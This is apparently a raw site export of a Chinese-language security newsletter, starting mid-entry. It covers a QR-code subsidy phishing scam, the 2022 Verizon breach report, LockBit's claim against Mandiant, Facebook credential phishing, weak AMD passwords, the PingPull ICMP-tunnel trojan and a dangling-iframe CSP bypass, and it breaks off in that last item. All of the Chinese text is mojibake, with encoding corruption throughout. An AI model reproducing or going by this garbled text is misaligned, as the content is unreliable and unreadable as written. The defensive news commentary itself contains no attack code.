ï¼Œè¯¥è¯ˆéª—æ¡ˆæ‰¿è¯ºå‘æä¾›é“¶è¡Œè´¦æˆ·å’Œå…¶ä»–ä¸ªäººèº«ä»½ä¿¡æ¯çš„å—ç›Šäººæä¾›â€œæ´¥è´´â€ã€‚\r\n\r\nå¥‡å®‰ä¿¡ã€ä¸­ç¿å¤©ä¸‹å’Œå¾®æ­¥åœ¨çº¿ç­‰å‚å•†å‡å¯¹è¿™ä¸€ä»¶äº‹ä»¶å‘å¸ƒäº†åˆ†ææŠ¥å‘Šï¼Œå®Œæ•´çš„æ”»å‡»è¿‡ç¨‹å¤§è‡´ä¸ºï¼š\r\n\r\n1. é€šè¿‡ç½‘ç»œæ”»å‡»æ‰‹æ®µè·å–åˆ°ç›®æ ‡é‚®ä»¶æœåŠ¡å™¨é«˜çº§æƒé™è´¦å·\r\n2. ä»¥è´¢åŠ¡éƒ¨ã€ç¨åŠ¡å±€ã€äººåŠ›èµ„æºå’Œç¤¾ä¼šä¿éšœæœåŠ¡å¹³å°åŠå›½å®¶ç¤¾ä¼šä¿é™©å…¬å…±æœåŠ¡ç­‰éƒ¨é—¨åä¹‰ä¸‹å‘çš„ã€Šå…³äºå‘å¸ƒ2022æœ€æ–°è¡¥è´´é€šçŸ¥ã€‹é‚®ä»¶\r\n3. è¯¥å°é‚®ä»¶æ­£æ–‡ä¸­æ”¾ç½®äº†ä¸€å¼ äºŒç»´ç å›¾ç‰‡ï¼Œè¯±å¯¼æ”¶ä»¶äººæ‰«ææ­£æ–‡ä¸­äºŒç»´ç ã€‚é‚®ä»¶é™„ä»¶çš„å†…å®¹å’Œé‚®ä»¶æ­£æ–‡ä¸€æ ·ï¼Œå¹¶æœªæºå¸¦ç—…æ¯’å’Œå¯æ‰§è¡Œæ–‡ä»¶ã€‚ï¼ˆè¯¥ç»„ç»‡åˆ©ç”¨ DGA åŸŸåç”ŸæˆæŠ€æœ¯ï¼Œç”Ÿæˆäº†å¤§é‡ç”¨äºåšä¸ºè·³æ¿çš„ DGA åŸŸåï¼Œå°†å…¶åˆ¶æˆäºŒç»´ç ã€‚å—å®³è€…é€šè¿‡æ‰‹æœºæ‰«æäºŒç»´ç æ¥è§£æåˆ°å¯¹åº”çš„é’“é±¼é¡µé¢ï¼‰\r\n4. é€šè¿‡å¿«æ·æ”¯ä»˜è¿›è¡Œç›—åˆ·ï¼Œè´­ä¹°è™šæ‹Ÿå•†å“è¿›è¡Œåˆ†é”€å˜ç°\r\n\r\n#### ä¸€äº›æ„Ÿæ‚Ÿ\r\n> 2021å¹´12æœˆï¼Œä¸­å›½ä¿¡é€šé™¢å‘å¸ƒçš„æŠ¥å‘Šç§°ï¼Œé’“é±¼é‚®ä»¶çš„å‘ä»¶è€…ä¼šæ¨¡ä»¿æˆä¿¡èª‰è‰¯å¥½çš„ç»„ç»‡æˆ–æœºæ„ï¼Œå…¶ç›®æ ‡é€šå¸¸æ˜¯çªƒå–èº«ä»½éªŒè¯æ•°æ®ç­‰æ•æ„Ÿä¿¡æ¯ã€å®‰è£…æ¶æ„è½¯ä»¶æˆ–è·å–ä¿¡ç”¨å¡å·ç­‰å…¶ä»–è´¢åŠ¡èµ„æºã€‚ä¸€éƒ¨åˆ†é’“é±¼æ”»å‡»å±äºé±¼å‰å¼ç½‘ç»œé’“é±¼ï¼Œå…·æœ‰é«˜åº¦é’ˆå¯¹æ€§ï¼Œä½†æ˜¯æ— ç¡®å®šæ”»å‡»å¯¹è±¡çš„â€œå¹¿æ’’ç½‘â€å¼é’“é±¼æ”»å‡»æ´»åŠ¨æ›´ä¸ºæ™®éã€‚æœªæ¥è¾ƒé•¿ä¸€æ®µæ—¶é—´å†…ï¼Œç½‘ç»œé’“é±¼æ”»å‡»å°†å˜å¾—è¶Šæ¥è¶Šå¸¸è§ï¼Œå¹¶å¯èƒ½å’Œå‹’ç´¢è½¯ä»¶ã€APTæ”»å‡»ç­‰æ‰‹æ®µç›¸ç»“åˆï¼Œè¯±é¥µå’Œæ‰€ç”¨é‚®ç®±ä¹Ÿå°†å’Œä¼ä¸šæœºæ„ä¿¡æ¯æœ‰æ›´é«˜çš„ç›¸å…³åº¦ã€‚å®‰å…¨äººå‘˜å¯é€‚å½“å¼€å±•ç½‘ç»œå®‰å…¨åŸ¹è®­ã€ç½‘ç»œé’“é±¼æ¨¡æ‹Ÿæ¼”ç»ƒç­‰å·¥ä½œï¼Œå®šæœŸç£ä¿ƒå‘˜å·¥è­¦æƒ•é’“é±¼æ”»å‡»çš„é£é™©å’Œå±å®³ï¼Œæå‡å‘˜å·¥ç½‘ç»œå®‰å…¨æ„è¯†ï¼Œé˜²æ­¢è¢«ç½‘ç»œé’“é±¼ã€‚\r\n\r\n#### çŸ¥è¯†æ‰©å±•\r\n\r\n1. Googleçš„è¿™ä¸ªé˜²é’“é±¼æµ‹è¯•æŒºæœ‰æ„æ€ï¼Œç”¨æ¥åšå®‰å…¨æ„è¯†åŸ¹è®­æ¯”å¹²å·´å·´çš„æ–‡å­—ä½“éªŒå¥½å¤ªå¤šï¼Œ[https://phishingquiz.withgoogle.com](https://phishingquiz.withgoogle.com/)\r\n2. Microsoftçš„é’“é±¼æ¨¡æ‹Ÿè®­ç»ƒï¼Œ[https://docs.microsoft.com/zh-cn/microsoft-365/security/office-365-security/attack-simulation-training](https://docs.microsoft.com/zh-cn/microsoft-365/security/office-365-security/attack-simulation-training?view=o365-worldwide)\r\n\r\n#### å‚è€ƒèµ„æ–™\r\n- https://mp.weixin.qq.com/s/qGbwJJ5oGn4tdnFadq0c8g\r\n- https://mp.weixin.qq.com/s/-WjOYPWIEGAUenLsQs7D7w\r\n- https://mp.weixin.qq.com/s/uEiJIFzCqVuFsPzONu7v_A\r\n- https://support.microsoft.com/zh-cn/windows/%E9%98%B2%E8%8C%83%E7%BD%91%E7%BB%9C%E9%92%93%E9%B1%BC-0c7ea947-ba98-3bd9-7184-430e1f860a44\r\n\r\n## è¡Œä¸šæŠ¥å‘Š\r\n\r\n### Verizon Business å‘å¸ƒäº†2022å¹´æ•°æ®æ³„éœ²è°ƒæŸ¥æŠ¥å‘Š\r\nä¸»è¦å‘ç°åŒ…æ‹¬: \r\n1. å‹’ç´¢è½¯ä»¶æ”»å‡»äº‹ä»¶åŒæ¯”å¢åŠ äº†13% ï¼Œæ¯”è¿‡å»5å¹´çš„æ€»å’Œè¿˜è¦å¤š\r\n2. å¤§çº¦äº”åˆ†ä¹‹å››çš„è¿è§„è¡Œä¸ºå¯å½’å› äºæœ‰ç»„ç»‡çŠ¯ç½ªï¼Œå¤–éƒ¨è¡Œä¸ºè€…åœ¨ä¸€ä¸ªç»„ç»‡ä¸­é€ æˆè¿è§„è¡Œä¸ºçš„å¯èƒ½æ€§å¤§çº¦æ˜¯å†…éƒ¨è¡Œä¸ºè€…çš„4å€\r\n3. åœ¨è¿‡å»çš„ä¸€å¹´ä¸­ï¼Œ82% çš„æ•°æ®æ³„éœ²éƒ½ä¸äººä¸ºå› ç´ æœ‰å…³\r\n\r\n#### ä¸€äº›æ„Ÿæ‚Ÿ\r\n> æ­£å¦‚Lapsus$é ä¹°é€šå†…éƒ¨äººå‘˜æ‹¿ä¸‹ä¸€å®¶åˆä¸€å®¶çš„çŸ¥åå…¬å¸ä¸€æ ·ï¼Œäººä¸ºå› ç´ ä¸€ç›´æ˜¯å¯¼è‡´ç½‘ç»œå®‰å…¨äº‹ä»¶çš„ä¸»è¦åŸå› ï¼Œå®‰å…¨ä¸å…‰æ˜¯æŠ€æœ¯å¯¹æŠ—ï¼Œæ›´å¤šçš„æ˜¯äººä¹‹é—´çš„å¯¹æŠ—ï¼›è€Œåœ¨ç°ä»£ä¼ä¸šçš„ç½‘ç»œå®‰å…¨é˜²å¾¡ä½“ç³»ä¸­ï¼Œäººä¹Ÿæ˜¯æœ€ä¸å—é‡è§†çš„ç¯èŠ‚ï¼Œå¤§å®¶è¡·äºé‡‡è´­æœ€å…ˆè¿›çš„ç½‘ç»œå®‰å…¨æŠ€æœ¯å’Œæ–¹æ¡ˆï¼Œå¹¶è¯•å›¾æé«˜å®‰å…¨å·¥å…·é›†æˆåº¦å’Œè‡ªåŠ¨åŒ–æ°´å¹³ï¼Œå´åœ¨å‘˜å·¥å®‰å…¨æ„è¯†ä¸ŠæŠ•å…¥ä¸è¶³ã€‚äººå‘˜æ¼æ´æ˜¯æœ€å±é™©ä¹Ÿæœ€å®¹æ˜“ä¿®å¤çš„æ¼æ´ï¼ˆä¸éœ€è¦æ˜‚è´µçš„æŠ€æœ¯äº§å“å’Œé¡¶å°–æŠ€æœ¯äººæ‰ï¼‰ï¼ŒåŒæ—¶ä¹Ÿæ˜¯æœ€éš¾ä¿®å¤çš„æ¼æ´ï¼ˆä¸è¢«é‡è§†ã€ç¼ºä¹é¢„ç®—ï¼‰ã€‚\r\n>\r\n> RSAC 2020çš„ä¸»é¢˜æ˜¯ï¼šâ€œäººæ˜¯å®‰å…¨è¦ç´ â€ï¼ŒRSACåœ¨å‘å¸ƒæœ¬æ¬¡å¤§ä¼šä¸»é¢˜æ—¶å®£ç§°ï¼Œç½‘ç»œå®‰å…¨ä¸æ–­å‘å±•ï¼Œæˆ‘ä»¬ä¸æ–­æå‡ºæ—¨åœ¨é˜»æ­¢å¨èƒçš„æ–°ç­–ç•¥å’Œæ–°æ–¹æ³•ã€‚äººå·¥æ™ºèƒ½å’Œæœºå™¨å­¦ä¹ ç­‰æ–°æŠ€æœ¯æ¯”ä»¥å¾€ä»»ä½•æ—¶å€™éƒ½æ›´æœ‰æ•ˆç‡åœ°ä¸ä¸è‰¯è¡Œä¸ºè€…ä½œæˆ˜ã€‚é«˜çº§æ¶æ„å·¥å…·çš„æ—¥ç›Šæ™®åŠã€æˆæœ¬æ›´ä½ï¼Œä½¿ç½‘ç»œçŠ¯ç½ªæ›´åŠ å¹³æ°‘åŒ–ã€‚â€œäººæ˜¯å®‰å…¨çš„å…³é”®è¦ç´ â€è¿™ä¸€åŸºæœ¬è®¤è¯†ä¼¼ä¹å·²è¢«é—å¿˜ã€‚ä½†æ— è®ºæ˜¯å®‰å…¨é˜²æŠ¤è¿˜æ˜¯æ”»å‡»èƒŒåçš„æ’ä¹…åŠ›é‡ä¸€ç›´éƒ½æ˜¯äººã€‚å³ä¾¿è¿›å…¥å®‰å…¨è‡ªåŠ¨åŒ–æ—¶ä»£ï¼Œæˆ‘ä»¬åº”å¯¹ç½‘ç»œæ”»å‡»çš„æœ€å®è´µçš„æ­¦å™¨å°†æ°¸è¿œæ˜¯è‡ªå·±ã€‚å› æ­¤ï¼Œè¿›å…¥21ä¸–çºªçš„ç¬¬ä¸‰ä¸ªåå¹´ï¼ŒRSAC2020æˆä¸ºæé†’ä¸šç•Œè®°èµ·â€œäººæ˜¯å®‰å…¨è¦ç´ â€è¿™ä¸€åŸºæœ¬è®¤è¯†çš„å¥½æ—¶æœºã€‚\r\n>\r\n> çŸ¥åé»‘å®¢Kevin Mitnickåœ¨15å¹´å‰æ›¾å†™é“ï¼šäººï¼Œè€ŒéæŠ€æœ¯ï¼Œæ‰æ˜¯å®‰å…¨æœ€å¼±çš„ä¸€ç¯ã€‚åœ¨å…¶ç•…é”€ä¹¦ã€Šæ¬ºéª—çš„è‰ºæœ¯ï¼šæ§åˆ¶å®‰å…¨ä¸­äººçš„è¦ç´ ã€‹ï¼ŒKevin Mitnickè¯å®äº†ï¼Œå³ä¾¿æ²¡æœ‰é«˜çº§çš„é»‘å®¢æŠ€æœ¯ï¼Œç¤¾å·¥æ‰‹æ®µä¾ç„¶å¯ä»¥å¯¼è‡´å¤§è§„æ¨¡æ•°æ®æ³„éœ²ã€‚\r\n\r\n#### å‚è€ƒèµ„æ–™\r\n- https://www.verizon.com/business/resources/reports/2022/dbir/2022-data-breach-investigations-report-dbir.pdf"},{"fields":{"slug":"/å®‰å…¨é€šè®¯ Security.News/Security.News@202206/","title":"Security.News@202206"},"frontmatter":{"draft":false},"rawBody":"---\r\ntitle: Security.News@202206\r\ntags:\r\n  - å®‰å…¨é€šè®¯ Security.News\r\n  - è¡Œä¸šåŠ¨æ€\r\n  - å®‰å…¨äº‹ä»¶\r\n  - è¡Œä¸šæŠ¥å‘Š\r\n  - TTPsåŠ¨æ€\r\n  - å­¦ä¹ èµ„æº\r\n  - Mandiant\r\n  - RSAC\r\n  - åˆ›æ–°æ²™ç›’\r\n  - é’“é±¼\r\n  - ICMPéš§é“\r\n  - é£é™©è¯„ä¼°\r\n  - Google\r\n  - Bypass\r\n  - CSP\r\n  - AMD\r\n  - TTPs\r\n  - å­¦ä¹ èµ„æº\r\n---\r\n\r\n## å®‰å…¨äº‹ä»¶\r\n### LockBit å‹’ç´¢è½¯ä»¶çš„å›¢ä¼™å£°ç§°å·²ç»å…¥ä¾µäº†ç½‘ç»œå®‰å…¨å…¬å¸ Mandiantï¼Œè¯¥å…¬å¸æ­£åœ¨è°ƒæŸ¥æ‰€è°“çš„å®‰å…¨äº‹ä»¶\r\n\r\næœ¬æœˆæ—©äº›æ—¶å€™ï¼ŒMandiant å…¬å¸å‘å¸ƒäº†ä¸€ä»½æŠ¥å‘Šï¼Œç§°ç½‘ç»œçŠ¯ç½ªå›¢ä¼™â€œé‚ªæ¶å…¬å¸â€(Evil Corp) è½¬ç”¨ LockBit 2.0å‹’ç´¢è½¯ä»¶æ¥é€ƒé¿åˆ¶è£ï¼›ä¹‹åï¼ŒLockBit å‹’ç´¢è½¯ä»¶å›¢ä¼™å°†ç½‘ç»œå®‰å…¨å…¬å¸ Mandiant åˆ—å…¥å…¶é»‘ç½‘æ³„éœ²ç½‘ç«™å…¬å¸ƒçš„å—å®³è€…åå•ã€‚Mandiant æ­£åœ¨è°ƒæŸ¥å‹’ç´¢è½¯ä»¶å›¢ä¼™çš„è¯´æ³•ï¼Œè¿™ä¸ªç½‘ç»œçŠ¯ç½ªå›¢ä¼™å®£ç§°ä»è¯¥å…¬å¸ç›—å–äº†356841æ–‡ä»¶ï¼Œå¹¶è®¡åˆ’åœ¨ç½‘ä¸Šæ³„éœ²è¿™äº›æ–‡ä»¶ã€‚\r\n\r\nMandiant å…¬å¸è¿…é€Ÿå›åº”äº†è®°è€…çš„ç½®è¯„è¯·æ±‚ï¼Œå¹¶å‘è¡¨å£°æ˜ç§°: â€œ Mandiant å…¬å¸çŸ¥é“è¿™äº›ä¸ lockbit ç›¸å…³çš„å£°æ˜ã€‚åœ¨è¿™ä¸€ç‚¹ä¸Šï¼Œæˆ‘ä»¬æ²¡æœ‰ä»»ä½•è¯æ®æ”¯æŒä»–ä»¬çš„è¯´æ³•ã€‚æˆ‘ä»¬å°†ç»§ç»­å¯†åˆ‡å…³æ³¨äº‹æ€å‘å±•ã€‚â€\r\n\r\n![JLtatI](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/JLtatI.jpg)\r\n\r\n#### ä¸€äº›æ„Ÿæ‚Ÿ\r\n> ç­‰å¾…æ›´å¤šç»†èŠ‚æŠ«éœ²ï¼ŒæŒç»­è·Ÿè¿›ä¸­\r\n\r\n#### å‚è€ƒèµ„æ–™\r\n- https://financialpost.com/technology/lockbit-claims-mandiant-data-will-be-published-mandiant-says-no-evidence-of-theft\r\n\r\n### ä¸€ä¸ªç½‘ç»œç½ªçŠ¯å›¢é˜Ÿåœ¨4ä¸ªæœˆå†…å·èµ°äº†100ä¸‡ Facebook è´¦æˆ·å‡­è¯\r\n\r\n2021å¹´åº•ï¼Œé˜²ç½‘ç»œé’“é±¼å…¬å¸ Pixm çš„å®‰å…¨ç ”ç©¶äººå‘˜å‘ç°ï¼Œè¿™é¡¹é’“é±¼æ”»å‡»äº‹ä»¶ä»å»å¹´Q4æ‰å¼€å§‹ï¼Œä½†å·²ç»è¯æ˜éå¸¸æˆåŠŸã€‚åœ¨ Pixm å‘ç°çš„å¤§çº¦400ä¸ªç™»é™†é¡µé¢ä¸­ï¼Œä»…ä»…ä¸€ä¸ªåœ¨2021å¹´å°±æœ‰270ä¸‡çš„è®¿é—®é‡ï¼Œå¹¶ä¸”åœ¨2022å¹´å·²ç»éª—å–äº†850ä¸‡çš„è®¿é—®é‡ã€‚\r\n\r\nPixm ç¡®å®šäº†å¤§çº¦400ä¸ªç‹¬ç‰¹çš„é’“é±¼é¡µé¢; å¯¹å…¶ä¸­17ä¸ªé¡µé¢çš„éšæœºåˆ†ææ˜¾ç¤ºï¼Œå¹³å‡æµè§ˆé‡ä¸º985,228é¡µã€‚æ¨ç®—åˆ°400é¡µï¼Œä½ ä¼šå¾—åˆ°399,017,673æ¬¡è®¿é—®ã€‚â€œæˆ‘ä»¬ä¼°è®¡ï¼Œè¿„ä»Šä¸ºæ­¢ç¡®å®šçš„400ä¸ªç”¨æˆ·åï¼Œä»¥åŠä»–ä»¬æ‰€æœ‰ç‹¬ç‰¹çš„é’“é±¼ç½‘é¡µï¼Œåªä»£è¡¨äº†è¿™ä¸ªæ´»åŠ¨çš„ä¸€å°éƒ¨åˆ†,â€Pixm è¯´ã€‚\r\n\r\n#### ä¸€äº›æ„Ÿæ‚Ÿ\r\n> æ”»å‡»è€…ä½¿ç”¨åˆæ³•çš„ç«™ç‚¹æ‰˜ç®¡ç½‘ç«™ï¼ˆä¾‹å¦‚ glitch.meã€ Famous.coã€amaze.coã€funnel-preview.com ç­‰ï¼‰æ¥ç»•è¿‡Facebookçš„æ£€æµ‹ï¼Œé€šè¿‡Facebook Messagerä¼ æ’­ï¼Œè¿™ç§æ¨¡å¼å¯¹äºåŸºäºURLä¿¡èª‰åº¦çš„ä¼ ç»Ÿè§£å†³æ–¹æ¡ˆæ˜¯æ¯ç­æ€§æ‰“å‡»çš„ï¼Œè€ŒåŸºäºå†…å®¹çš„æ£€æµ‹å¯èƒ½æ˜¯å› ä¸ºæˆæœ¬è¿‡å¤§è€Œæ— æ³•å¤§è§„æ¨¡åº”ç”¨ã€‚è¿™ç§æ¨¡å¼çš„æ”»å‡»å·²ç»éå¸¸æˆç†Ÿäº†ï¼Œå†å²ä¸Šç»å…¸çš„æ¡ˆä¾‹åŒ…æ‹¬ï¼šGithub Pageã€Google Translateã€Azure Blob å­˜å‚¨ã€AmazonÂ Cloudfrontç­‰ã€‚\r\n\r\n#### å‚è€ƒèµ„æ–™\r\n- https://pixmsecurity.com/blog/blog/phishing-tactics-how-a-threat-actor-stole-1m-credentials-in-4-months/\r\n- https://www.theregister.com/2022/06/09/facebook_phishing_campaign/\r\n- https://www.proofpoint.com/us/threat-insight/post/threat-actors-abuse-github-service-host-variety-phishing-kits\r\n\r\n### AMDæœåŠ¡çš„450GBæ•°æ®è¢«çªƒå–\r\n\r\nå‹’ç´¢é›†å›¢ RansomHouse å£°ç§°ï¼ŒAMD å‘˜å·¥ä½¿ç”¨çš„â€œ123456â€ç­‰ç®€å•å¯†ç ä½¿çªƒå–æ•°æ®å˜å¾—å®¹æ˜“ã€‚\r\n\r\næ ¹æ® [TechCrunch](https://techcrunch.com/2022/06/28/amd-extortion-ransomhouse/) çš„æŠ¥é“ï¼Œä»–ä»¬å·²ç»çœ‹åˆ°äº†ä¸€äº›è¢«ç›—çš„æ•°æ®ï¼ŒRansomHouseä¸æ˜¯åœ¨å¼€ç©ç¬‘ï¼Œå¯†ç å¾ˆç®€å•ã€‚AMD çš„å‘˜å·¥æ˜¾ç„¶æ˜¯ä¾é å¯†ç ï¼Œå¦‚â€œpasswordâ€ï¼Œâ€œ123456â€å’Œâ€œWelcome1â€æ¥ä¿æŠ¤ä»–ä»¬çš„å¸æˆ·ã€‚æˆ‘ä»¬éƒ½çŸ¥é“è¿™ä¸æ˜¯ä¸ªå¥½ä¸»æ„ã€‚\r\n\r\n#### ä¸€äº›æ„Ÿæ‚Ÿ\r\n> å¼±å£ä»¤æ˜¯è€ç”Ÿå¸¸è°ˆçš„è¯é¢˜äº†ï¼Œæ²¡æƒ³åˆ°2022å¹´äº†ï¼ŒAMDå±…ç„¶è¿˜åœ¨ä½¿ç”¨è¿™äº›å¯†ç ã€‚\r\n>\r\n> ç®€å•ç»Ÿè®¡äº†ä¸‹RansomHouseå…¬å¼€çš„æ•°æ®ï¼Œå…±xxæ¡è®°å½•ï¼Œå…¶ä¸­password 89æ¡ï¼ŒP@ssw0rd 72æ¡ï¼ŒAmd!23 31æ¡ï¼ŒWelcome1 21æ¡ï¼Œp@ssw0rd1 9æ¡ã€‚\r\n>\r\n> æœ‰æ„æ€çš„æ˜¯ï¼Œé”®ç›˜æ¼«æ¸¸æ¨¡å¼çš„å¯†ç ä¹Ÿå‡ºç°äº†å¥½å‡ æ¬¡ï¼Œå…·ä½“å¯ä»¥çœ‹è¿™é‡Œ https://twitter.com/PyroTek3/status/1473036483661553669\r\n\r\n#### å‚è€ƒèµ„æ–™\r\n- https://techcrunch.com/2022/06/28/amd-extortion-ransomhouse/\r\n\r\n## è¡Œä¸šåŠ¨æ€\r\n### ä»¥è‰²åˆ—ç½‘ç»œå®‰å…¨åˆ›ä¸šå…¬å¸ Talon åœ¨ RSA å¤§ä¼šä¸Šè¢«è¯„ä¸ºâ€œæœ€å…·åˆ›æ–°åŠ›â€\r\n\r\nRSA å…¬å¸å‘¨äºŒå®£å¸ƒï¼Œä¿¡æ¯å®‰å…¨äº‹ä»¶ RSA ä¼šè®®å·²ç»å°†ä»¥è‰²åˆ—çš„ Talon Cybersecurity è¯„ä¸ºå¹´åº¦ RSAC åˆ›æ–°æ²™ç›’å¤§èµ›çš„è·èƒœè€…ã€‚\r\n\r\nTalon è¢«è¯„ä¸ºâ€œæœ€å…·åˆ›æ–°æ€§çš„åˆåˆ›ä¼ä¸šâ€ï¼Œç”±ä¸€ç»„è¯„å§”é€‰å‡ºï¼Œåˆ›é€ äº†ä¸šå†…ç¬¬ä¸€ä¸ªå®‰å…¨çš„ä¼ä¸šæµè§ˆå™¨ï¼Œä½¿ä¼ä¸šèƒ½å¤Ÿç®€åŒ–å…¶å®‰å…¨ç¨‹åºï¼ŒåŒæ—¶æä¾›å®‰å…¨å’Œæ”¹è¿›çš„æ··åˆå·¥ä½œä½“éªŒã€‚\r\n\r\n#### ä¸€äº›æ„Ÿæ‚Ÿ\r\n> äº‘ä¸Šå®‰å…¨ä¸€èˆ¬å¯ä»¥åˆ†ä¸ºä¸¤ç±»ï¼šä¿æŠ¤ä¼ä¸šäº‘ä¸Šè‡ªæœ‰ä¸šåŠ¡ï¼Œä»¥åŠä¿æŠ¤å‘˜å·¥å®‰å…¨çš„è®¿é—®äº‘ä¸Šä¸šåŠ¡ã€‚è€ƒè™‘åˆ°å›½å¤–ä¼ä¸šå¤§é‡ä½¿ç”¨WebæœåŠ¡æˆ–SaaSæœåŠ¡ï¼Œå„ç±»ä¸šåŠ¡äº‹å®ä¸Šå°±æ˜¯WebæœåŠ¡æˆ–SaaSå½¢æ€ï¼Œæ‰€ä»¥åè€…çš„åœºæ™¯å¯ä»¥æ³›åŒ–ä¸ºä¿æŠ¤å‘˜å·¥è®¿é—®å„ç±»å¤–éƒ¨æœåŠ¡ã€‚\r\n>\r\n> ä»Talonçš„ç™½çš®ä¹¦å¯ä»¥çœ‹å‡ºï¼Œå®ƒå·²ç»å°†è‡ªå·±å®šä½æˆä¸€æ¬¾Webåº”ç”¨å’ŒSaaSçš„ç½‘å…³ç±»äº§å“ï¼ŒåŒæ—¶æä¾›äº†è¿è¡Œæ—¶éš”ç¦»ã€é›¶ä¿¡ä»»ã€æ•°æ®é˜²æ³„éœ²ç­‰èƒ½åŠ›ã€‚\r\n>\r\n> æµè§ˆå™¨å¯ä»¥æ˜¯å¤©ç„¶çš„é›¶ä¿¡ä»»agentã€‚\r\n\r\n#### å‚è€ƒèµ„æ–™\r\n- https://talon-sec.com/resources/whitepapers/white-paper-an-enterprise-browser-for-the-digital-business/\r\n- http://blog.nsfocus.net/rsa2022-talon-cyber-security-win/\r\n\r\n### ç¾å›½ HHS å®‰å…¨é£é™©è¯„ä¼°å·¥å…·å‘å¸ƒ3.3ç‰ˆæœ¬\r\n\r\nç¾å›½å«ç”Ÿä¸å…¬ä¼—æœåŠ¡éƒ¨(HHS)æ°‘æƒåŠå…¬å®¤(OCR)å’Œå›½å®¶å«ç”Ÿä¿¡æ¯æŠ€æœ¯åè°ƒå‘˜(ONC)å‘å¸ƒäº†å®‰å…¨é£é™©è¯„ä¼°(SRA)å·¥å…·3.3ç‰ˆã€‚SRAâ€œæ—¨åœ¨å¸®åŠ©åŒ»ç–—ä¿å¥æä¾›è€…æŒ‰ç…§ HIPAA å®‰å…¨è§„åˆ™å’ŒåŒ»ç–—ä¿é™©å’ŒåŒ»ç–—è¡¥åŠ©æœåŠ¡ä¸­å¿ƒ(CMS)ç”µå­å¥åº·è®°å½•(EHR)æ¿€åŠ±è®¡åˆ’çš„è¦æ±‚è¿›è¡Œå®‰å…¨é£é™©è¯„ä¼°ã€‚â€\r\n\r\n#### ä¸€äº›æ„Ÿæ‚Ÿ\r\n> æ°‘æƒåŠå…¬å®¤ (OCR) å’Œå›½å®¶å«ç”Ÿä¿¡æ¯æŠ€æœ¯åè°ƒå‘˜åŠå…¬å®¤ (ONC)å¼€å‘äº† SRA å·¥å…·ï¼Œä»¥å¸®åŠ© HIPAA æ¶µç›–çš„å®ä½“æ ¹æ®HIPAA å®‰å…¨è§„åˆ™å¯¼èˆªé£é™©è¯„ä¼°è¦æ±‚ã€‚\r\n>\r\n> SRA å·¥å…·çš„å—ä¼—ä¸»è¦åŒ…æ‹¬ä¸­å°å‹ä¾›åº”å•†ï¼Œå¯èƒ½ä¸é€‚ç”¨äºè¾ƒå¤§çš„ç»„ç»‡ï¼›å†…å®¹ä¸»è¦ä¸ºæ”¿ç­–å’Œåˆè§„ä¸ºä¸»ï¼Œåšèµ·æ¥æ¯”å®é™…çš„å®‰å…¨é˜²å¾¡/æ§åˆ¶èƒ½åŠ›å»ºè®¾è¦ç®€å•è®¸å¤šã€‚\r\n\r\n#### å‚è€ƒèµ„æ–™\r\n- https://healthitsecurity.com/news/onc-ocr-release-updated-version-of-hhs-security-risk-assessment-sra-tool\r\n- https://www.healthit.gov/topic/privacy-security-and-hipaa/security-risk-assessment-tool\r\n\r\n## è¡Œä¸šæŠ¥å‘Š\r\n### é»‘å®¢ç»„ç»‡Galliumä½¿ç”¨æ–°çš„éš¾ä»¥æ£€æµ‹çš„è¿œç¨‹è®¿é—®æœ¨é©¬\r\n\r\nUnit 42æœ€è¿‘å‘ç°äº†ä¸€ç§æ–°çš„ã€éš¾ä»¥æ£€æµ‹çš„è¿œç¨‹è®¿é—®æœ¨é©¬ç¨‹åºï¼Œåä¸º PingPullï¼Œæ­£åœ¨è¢«ä¸€ä¸ªå«åšè¿›é˜¶æŒç»­æ€§æ¸—é€æ”»å‡»(APT)çš„ç»„ç»‡ GALLIUM ä½¿ç”¨ã€‚\r\n\r\nPingPull å…·æœ‰åˆ©ç”¨ä¸‰ç§åè®®(ICMPã€ HTTP (S)å’ŒåŸå§‹ TCP)è¿›è¡Œå‘½ä»¤å’Œæ§åˆ¶(C2)çš„èƒ½åŠ›ã€‚å°½ç®¡ä½¿ç”¨ ICMP éš§é“å¹¶ä¸æ˜¯ä¸€ç§æ–°æŠ€æœ¯ï¼ŒPingPull ä½¿ç”¨ ICMP ä½¿å¾—æ£€æµ‹å…¶ C2é€šä¿¡å˜å¾—æ›´åŠ å›°éš¾ï¼Œå› ä¸ºå¾ˆå°‘æœ‰ç»„ç»‡åœ¨å…¶ç½‘ç»œä¸Šå®ç°å¯¹ ICMP æµé‡çš„æ£€æŸ¥ã€‚\r\n\r\n#### ä¸€äº›æ„Ÿæ‚Ÿ\r\n> ä¹‹å‰å°±æœ‰äººä½¿ç”¨ICMP/DNSéš§é“æ¥å…è´¹ä¸Šç½‘ï¼Œå°±æ˜¯åˆ©ç”¨è¿è¥å•†/ç½‘ç®¡æ— æ³•å¯¹è¿™äº›åè®®è¿›è¡Œè®¡è´¹è®¤è¯ï¼Œä¸”éš¾ä»¥ç¦æ­¢ä½¿ç”¨çš„ç©ºå­æ¥å®ç°çš„ã€‚ä½œä¸ºé˜²å®ˆæ–¹ï¼Œæˆ‘ä»¬ä¸å…‰è¦ç›‘æ§å¸¸ç”¨çš„TCP/UDPï¼Œæ›´åº”è¯¥å¯¹ICMP/DNSçš„ä½¿ç”¨é¢å¤–å…³æ³¨ï¼Œè¿™é‡Œå¾€å¾€ä¼šæˆä¸ºæ£€æµ‹ç›²ç‚¹ã€‚\r\n\r\n#### å‚è€ƒèµ„æ–™\r\n- https://unit42.paloaltonetworks.com/pingpull-gallium/\r\n- https://zgao.top/%E5%88%A9%E7%94%A8ptunnel%E5%BB%BA%E7%AB%8Bicmp%E9%9A%A7%E9%81%93%E5%AE%9E%E7%8E%B0%E8%81%94%E9%80%9A%E6%A0%A1%E5%9B%AD%E7%BD%91%E5%85%8D%E6%B5%81/\r\n\r\n## TTPsåŠ¨æ€\r\n### ä½¿ç”¨æ‚¬æŒ‚ iframe ç»•è¿‡ CSP\r\n\r\nCSP å°†about:blank URL è§†ä¸ºåŒæºï¼ˆåŒæºç­–ç•¥ï¼‰ï¼Œå½“æ”»å‡»è€…å°†è·¨åŸŸ iframe è®¾ç½®ä¸º about:blank æ—¶ï¼Œå®ƒå°±å˜å¾—å¯ä»¥è¢«æ”»å‡»è€…è¯»å–ï¼›è™½ç„¶Chromeä¹‹å‰é’ˆå¯¹****Dangling markup 